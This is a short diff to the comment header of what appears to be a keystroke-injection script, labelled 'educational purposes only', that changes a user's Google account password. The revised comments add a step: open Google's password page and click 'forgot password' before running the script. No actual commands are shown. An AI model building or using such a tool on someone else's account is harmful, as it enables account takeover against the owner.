@@ -1,6 +1,10 @@
 REM Educational purposes ONLY!!!
 
-REM Simple script that changes users google acc password, change where it says new password here with the password you want it to be, make sure they are the exact same for both.
+REM Before running code go to myaccount.google.com/signinoptions/password and than click forgot password than run script
+
+REM Simple script that changes users google acc password
+
+REM Change where it says new password here with the password you want it to be, make sure they are the exact same for both.
 
 REM Made by crazybomb47
 
